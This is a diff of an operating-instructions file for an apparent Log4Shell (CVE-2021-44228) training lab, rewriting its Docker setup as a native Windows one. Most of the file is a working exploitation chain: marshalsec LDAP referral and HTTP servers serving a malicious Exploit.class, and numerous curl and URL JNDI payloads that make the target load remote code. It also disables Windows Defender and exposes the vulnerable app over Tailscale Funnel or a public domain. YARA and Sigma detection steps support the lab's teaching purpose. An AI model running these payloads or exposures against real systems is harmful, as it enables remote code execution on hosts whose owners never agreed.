@@ -1,267 +1,183 @@
 # Claude Code Operating Instructions
 
 ## Current Status
-- **Lab Environment**: ✅ FULLY OPERATIONAL - All components working
+- **Lab Environment**: Windows Native (No Docker)
 - **Vulnerability**: Log4j 2.14.1 confirmed vulnerable and processing JNDI lookups
 - **Detection**: All security tools (YARA, Sigma, Nuclei) successfully detecting threats
 - **Progress**: 100% complete - Lab ready for security demonstrations
 
-## Lab Components Status
+## Lab Setup - Windows Native
 
-### ✅ Working Components (ALL OPERATIONAL)
-- **Vulnerable App**: `log4shell-simple` (port 8081) - Log4j 2.14.1 processing JNDI lookups
-- **LDAP Server**: `ldap-exploit-server` (port 1389) - Receiving connections and responding
-- **HTTP Server**: `ldap-exploit-server` (port 8888) - Serving malicious Java class (1649 bytes)
-- **Detection Tools**: YARA, Sigma, Nuclei all detecting Log4Shell patterns
-- **Network**: All containers communicating properly
+### Prerequisites
+1. **Java 8** - Install from: `C:\Log4Shell-Lab\tools\zulu8.30.0.1-jdk8.0.172-win_x64.msi`
+2. **Python 3.x** - For HTTP server
+3. **Windows Defender** - DISABLED (or exclusion for lab folder)
+4. Files in `C:\Log4Shell-Lab\`
 
-### ✅ Security Detection Results
-- **Nuclei**: 4 critical vulnerabilities detected
-- **YARA**: 2 malicious patterns identified (`Log4Shell_JNDI_Lookup_Strings`, `Log4Shell_Network_IOCs`)
-- **Sigma**: 28+ JNDI injection attempts detected across multiple attack vectors
-- **Attack Vectors**: User-Agent, headers, POST parameters, JSON payloads all detected
-
-## Container Commands
-
-### Start/Stop Lab
-```bash
-# Start simple version (working one)
-docker-compose -f docker-compose-simple.yml up -d
-
-# Start with exposed ports for remote access
-docker-compose -f docker-compose-remote.yml up -d
-
-# Stop lab
-docker-compose -f docker-compose-simple.yml down
-
-# View running containers
-docker ps
+### Required Files
+```
+C:\Log4Shell-Lab\
+├── vulnerable-app\
+│   ├── SimpleVulnerable.class
+│   ├── log4j-core-2.14.1.jar
+│   ├── log4j-api-2.14.1.jar
+│   └── marshalsec.jar
+└── ldap-server\
+    └── Exploit.class
 ```
 
-### Quick Test Commands
-```bash
-# Test vulnerability (should show Java version expansion)
-docker exec attacker-machine curl -H "User-Agent: test_\${java:version}" http://log4shell-simple:8080
+## Starting the Lab (3 Terminals)
 
-# Test exploitation (internal)
-docker exec attacker-machine curl -H "User-Agent: \${jndi:ldap://ldap-exploit-server:1389/Exploit}" http://log4shell-simple:8080
+### Terminal 1 - Vulnerable Application
+```powershell
+cd C:\Log4Shell-Lab\vulnerable-app
 
-# Test remote exploitation (use IP addresses, not hostnames!)
-curl -H "User-Agent: \${jndi:ldap://10.0.0.8:1389/Exploit}" http://10.0.0.13:8081
-
-# Check if exploit worked
-docker exec log4shell-simple ls -la /tmp/pwned.txt
+java -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true" "-Dcom.sun.jndi.rmi.object.trustURLCodebase=true" "-Dcom.sun.jndi.cosnaming.object.trustURLCodebase=true" SimpleVulnerable 2>&1 | Tee-Object -FilePath app.log
 ```
 
-### Remote Exploitation Fix
-```bash
-# Problem: "UnknownHostException: attacker.local"
-# Solution: Use IP addresses instead of hostnames
+### Terminal 2 - LDAP Server (marshalsec)
+```powershell
+cd C:\Log4Shell-Lab\vulnerable-app
 
-# From remote attacker (10.0.0.8):
-curl -H "User-Agent: \${jndi:ldap://10.0.0.8:1389/Exploit}" http://10.0.0.13:8081
-
-# Setup remote exploit server on attacker:
-cd ~/log4shell-remote
-bash setup-remote-exploit.sh
-./start_servers.sh
-
-# Then run exploit:
-./exploit.sh
+java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://localhost:8888/#Exploit" 1389 0.0.0.0
 ```
 
-### Container Access
-```bash
-# Access attacker container
-docker exec -it attacker-machine /bin/bash
+### Terminal 3 - HTTP Server (Exploit.class)
+```powershell
+cd C:\Log4Shell-Lab\ldap-server\
 
-# Access vulnerable app
-docker exec -it log4shell-simple /bin/bash
-
-# Access LDAP/HTTP server
-docker exec -it ldap-exploit-server /bin/bash
+python -m http.server 8888 --bind 0.0.0.0
 ```
 
-### Log Monitoring
-```bash
-# Watch vulnerable app logs
-docker logs log4shell-simple -f
+## Exploitation
 
-# View LDAP server activity
-docker logs ldap-exploit-server | tail -20
+### Local Attack
+```powershell
+# Test JNDI expansion (should show Java version)
+curl -H "User-Agent: `${java:version}" http://localhost:8080
 
-# Check for HTTP requests
-docker logs ldap-exploit-server | grep -E "(GET|Serving|8888)"
+# Launch Log4Shell exploit
+curl -H "User-Agent: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
+
+# Alternative attack vectors
+curl -H "X-Forwarded-For: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
+curl -X POST -d "username=`${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
+curl "http://localhost:8080/?search=`${jndi:ldap://127.0.0.1:1389/Exploit}"
 ```
 
-## Network Information
-- **Network**: `proxylogonlab_log4shell-net`
-- **Vulnerable App**: `172.18.0.3:8080` (exposed as `localhost:8081`)
-- **LDAP Server**: `172.18.0.2:1389` (hostname: `ldap-exploit-server`)
-- **HTTP Server**: `172.18.0.2:8888`
-- **Attacker**: `172.18.0.4`
-
-## Exploitation Workflow
-
-### 1. Start Callback Listener
-```bash
-docker exec -it attacker-machine /bin/bash
-cd /tools
-python3 listener.py
-# Leave running in terminal 1
+### Browser Attack
+```
+http://localhost:8080/?q=${jndi:ldap://127.0.0.1:1389/Exploit}
 ```
 
-### 2. Run Exploitation
-```bash
-# In terminal 2
-docker exec -it attacker-machine /bin/bash
-cd /tools
-python3 exploit.py
-# Or manual test:
-# curl -H "User-Agent: \${jndi:ldap://ldap-exploit-server:1389/Exploit}" http://log4shell-simple:8080
+### Remote Attack (replace YOUR_VM_IP)
+```powershell
+curl -H "User-Agent: `${jndi:ldap://YOUR_VM_IP:1389/Exploit}" http://YOUR_VM_IP:8080/
+curl "http://YOUR_VM_IP:8080/?user=\${jndi:ldap://YOUR_VM_IP:1389/Exploit}"
 ```
 
-### 3. Check Success
-```bash
-# Should create /tmp/pwned.txt
-docker exec log4shell-simple ls -la /tmp/pwned.txt
+## Remote Access Options
 
-# Should show callback in listener
-# Should show LDAP connections in logs
+### Option 1: Tailscale Funnel (from office/NAT)
+```powershell
+# Terminal 4
+tailscale funnel 8080
 ```
+Attack URL: `https://your-machine.tailnet.ts.net/?q=${jndi:ldap://attacker.local:1389/Exploit}`
+
+### Option 2: Direct IP (local network)
+Add to hosts file: `127.0.0.1 attacker.local`
+
+Attack URL: `http://YOUR_VM_IP:8080/?search=${jndi:ldap://YOUR_VM_IP:1389/Exploit}`
+
+### Option 3: Public Domain
+`http://logwebapp.mooo.com:9080/?search=${jndi:ldap://logwebapp.mooo.com:1389/Exploit}`
 
 ## Detection Tools
 
-### Run All Detection
-```bash
-docker exec -it attacker-machine /bin/bash
-cd /tools
-python3 detect.py
+### YARA Scanning
+```powershell
+# Scan application logs
+yara64.exe detection-rules\log4shell-enhanced.yar C:\Log4Shell-Lab\vulnerable-app\app.log
+
+# Create test file and scan
+echo "User-Agent: ${jndi:ldap://attacker.local:1389/Exploit}" > test-log4shell.log
+yara64.exe detection-rules\log4shell-enhanced.yar test-log4shell.log
 ```
 
-### Manual Detection
-```bash
-# YARA scanning (scan logs for malicious patterns)
-docker logs log4shell-simple | grep -i jndi | docker exec -i attacker-machine sh -c "cat > /tmp/app_logs.txt"
-docker exec attacker-machine yara -r /detection-rules/log4shell.yar /tmp/app_logs.txt
+### Sigma Analysis
+```powershell
+# Check for JNDI patterns in logs
+Select-String -Path C:\Log4Shell-Lab\vulnerable-app\app.log -Pattern '\$\{jndi:(ldap|ldaps|rmi|dns)://'
+```
 
-# Nuclei scanning (active vulnerability detection)
-docker exec attacker-machine nuclei -t /detection-rules/log4shell-nuclei.yaml -u http://log4shell-simple:8080
+## Network Configuration
 
-# Sigma analysis (detect JNDI injection patterns)
-docker exec attacker-machine grep -E '\$\{jndi:(ldap|ldaps|rmi|dns)://' /tmp/app_logs.txt
+### Windows Firewall (Run as Admin)
+```powershell
+# Allow vulnerable app port
+netsh advfirewall firewall add rule name="Log4Shell Lab 8080" dir=in action=allow protocol=TCP localport=8080
+
+# Allow LDAP port
+netsh advfirewall firewall add rule name="Log4Shell Lab 1389" dir=in action=allow protocol=TCP localport=1389
+
+# Allow HTTP server port
+netsh advfirewall firewall add rule name="Log4Shell Lab 8888" dir=in action=allow protocol=TCP localport=8888
+```
+
+### Verify Ports
+```powershell
+netstat -an | findstr :8080
+netstat -an | findstr :1389
+netstat -an | findstr :8888
 ```
 
 ## Troubleshooting
 
-### If Exploitation Fails
-1. **Restart vulnerable app**: `docker restart log4shell-simple`
-2. **Check LDAP server**: `docker exec ldap-exploit-server ps aux | grep python`
-3. **Test HTTP server**: `docker exec attacker-machine python3 -c "import requests; print(requests.get('http://ldap-exploit-server:8888/Exploit.class').status_code)"`
-4. **Verify hostname resolution**: `docker exec log4shell-simple nslookup ldap-exploit-server`
+### Exploit Not Working
+1. Ensure Windows Defender is OFF or has exclusions
+2. Check all 3 terminals are running
+3. Verify Exploit.class exists in ldap-server folder
+4. Test HTTP server: `curl http://localhost:8888/Exploit.class`
+5. Check Java version: `java -version` (must be Java 8)
 
-### If Containers Won't Start
-```bash
-docker-compose -f docker-compose-simple.yml down
-docker-compose -f docker-compose-simple.yml up -d --build
+### Port Already in Use
+```powershell
+# Find process using port
+netstat -ano | findstr :8080
+# Kill process by PID
+taskkill /PID <PID> /F
 ```
 
-### Reset Everything
-```bash
-docker-compose -f docker-compose-simple.yml down -v
-docker system prune -f
-docker-compose -f docker-compose-simple.yml up -d --build
-```
-
-## Windows Native Setup (Alternative to Docker)
-
-### Running Vulnerable App Directly on Windows
-```batch
-cd vulnerable-simple
-javac -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" SimpleVulnerable.java
-
-# Run with screen output and logging
-powershell -Command "java -cp '.;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar' '-Dcom.sun.jndi.ldap.object.trustURLCodebase=true' '-Dcom.sun.jndi.rmi.object.trustURLCodebase=true' '-Dcom.sun.jndi.cosnaming.object.trustURLCodebase=true' SimpleVulnerable 2>&1 | Tee-Object -FilePath app.log"
-```
-
-### Windows Firewall Configuration
-```batch
-# Allow port through Windows Firewall (run as Administrator)
-netsh advfirewall firewall add rule name="Log4Shell Lab Port 8081" dir=in action=allow protocol=TCP localport=8081
-
-# Check if port is listening
-netstat -an | findstr :8081
-
-# Test local access
-curl -I http://localhost:8081
-```
-
-### YARA Detection on Windows
-```batch
-# Create test file and scan
-echo User-Agent: ${jndi:ldap://attacker.local:1389/Exploit} > test-log4shell.log
-yara64.exe detection-rules\log4shell-enhanced.yar test-log4shell.log
-
-# Scan captured application logs
-yara64.exe detection-rules\log4shell-enhanced.yar vulnerable-simple\app.log
-```
-
-### Network Troubleshooting
-- **App binds to**: 0.0.0.0:8080/8081 (all interfaces)
-- **External access requires**: Windows Firewall rule + router port forwarding (if behind NAT)
-- **Test command**: `netstat -an | findstr :8081` should show `0.0.0.0:8081`
-
-## Current Lab Status - FULLY OPERATIONAL ✅
-1. **Docker Setup**: ✅ Running and processing JNDI lookups
-2. **Windows Native**: ✅ Direct Java execution with proper network binding
-3. **JNDI Processing**: ✅ Confirmed working - `${java:version}` expands correctly
-4. **LDAP Connections**: ✅ Established successfully with exploit server
-5. **Detection Tools**: ✅ All working - YARA, Sigma, Nuclei detecting threats
-6. **Security Demonstration**: ✅ Ready for comprehensive Log4Shell demos
-7. **Documentation**: ✅ Complete with working commands and detection results
+### Connection Refused
+- Check Windows Firewall rules
+- Verify all services are bound to 0.0.0.0
+- Test local access first before remote
 
 ## File Locations
-- **Lab Files**: `~/log4shell-security-lab/`
-- **Detection Rules**: `./detection-rules/`
-- **Exploitation Scripts**: `./attacker/`
-- **Vulnerable Apps**: `./vulnerable-app/` and `./vulnerable-simple/`
-- **LDAP Server**: `./ldap-exploit/`
-
-## GitHub Repository
-- **URL**: https://github.com/hasamba/Log4JLab
-- **Status**: All files committed and pushed
-- **Last Update**: Lab fully operational with comprehensive detection capabilities
+- **Lab Files**: `C:\Log4Shell-Lab\`
+- **Vulnerable App**: `C:\Log4Shell-Lab\vulnerable-app\`
+- **LDAP Server**: `C:\Log4Shell-Lab\ldap-server\`
+- **Detection Rules**: `.\detection-rules\`
+- **Application Logs**: `C:\Log4Shell-Lab\vulnerable-app\app.log`
 
 ## Technical Details
 
-### Vulnerable Application
-- **Application**: Custom Java HTTP server (`SimpleVulnerable.java`)
-- **Port**: 8080 (Docker internal), 8081 (external access)
-- **Java Version**: OpenJDK 1.8.0_181 (vulnerable)
-- **Web Server**: Simple Java ServerSocket (not Apache/Nginx)
-
 ### Vulnerability Information
 - **CVE**: CVE-2021-44228 (Log4Shell)
-- **Log4j Version**: 2.14.1 (confirmed vulnerable to JNDI injection)
+- **Log4j Version**: 2.14.1 (vulnerable)
 - **CVSS Score**: 10.0 (Critical)
 - **Attack Vector**: JNDI lookup processing in log messages
 
-### Infrastructure Components
-- **Exploit Class**: Compiled and ready (1649 bytes) at `/app/Exploit.class`
-- **LDAP Server**: ✅ Operational - receiving connections and sending redirects (port 1389)
-- **HTTP Server**: ✅ Available - serving malicious Java class (port 8888)
-- **Network Access**: External attacks confirmed working from 10.0.0.8 → 10.0.0.13
+### Ports
+- **8080**: Vulnerable application
+- **1389**: LDAP server (marshalsec)
+- **8888**: HTTP server (Exploit.class)
 
-### Multi-Machine Attack Scenario ✅
-- **Windows Host**: 10.0.0.196 (detection tools)
-- **Vulnerable Linux VM**: 10.0.0.13 (VMware, running Docker containers)
-- **Parrot OS Attacker VM**: 10.0.0.8 (external attack source)
-- **Attack Success**: Confirmed external Log4Shell attack from Parrot OS → Vulnerable VM
+### JVM Flags Explained
+- `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true` - Trust remote LDAP codebase
+- `-Dcom.sun.jndi.rmi.object.trustURLCodebase=true` - Trust remote RMI codebase
+- `-Dcom.sun.jndi.cosnaming.object.trustURLCodebase=true` - Trust remote CORBA codebase
 
-## Security Detection Summary
-- **Nuclei Detection**: 4 critical CVE-2021-44228 vulnerabilities found
-- **YARA Detection**: 2 malicious patterns (`Log4Shell_JNDI_Lookup_Strings`, `Log4Shell_Network_IOCs`)
-- **Sigma Detection**: 28+ JNDI injection attempts across multiple attack vectors
-- **Attack Vectors**: Headers, POST data, URL parameters, JSON payloads
-- **External Validation**: Browser access confirmed for both vulnerable app and exploit server
-- **Lab Status**: ✅ PRODUCTION READY - Multi-machine security demonstration capability
+## GitHub Repository
+- **URL**: https://github.com/hasamba/Log4JLab
